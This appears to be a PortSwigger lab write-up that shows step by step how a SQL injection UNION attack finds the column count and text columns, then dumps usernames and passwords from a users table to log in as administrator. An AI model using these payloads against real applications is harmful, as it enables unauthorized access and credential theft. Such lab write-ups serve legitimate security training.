## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/357366bf0e25866c031a4eed18b25a99fbe341dd/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables/Images/Lab%20Description.png)

## Solution :

> The database contains a different table called **users**, with columns called username and password.

#### Determine number of columns

**ORDER BY 3** shows an error , it means the web application retreives 2 columns in the query

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image]()

#### Determine which column contains text data

*1st columns returns text data*

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'A',NULL --
```

![image]()

*2nd column also retreives text data*

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'A' --
```

![image]()

Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT username,password FROM users --
```
![image]()

![image]()

![image]()

Thus we got all the usernames & password stored in the database.

Now we can login as administrator !

![image]()



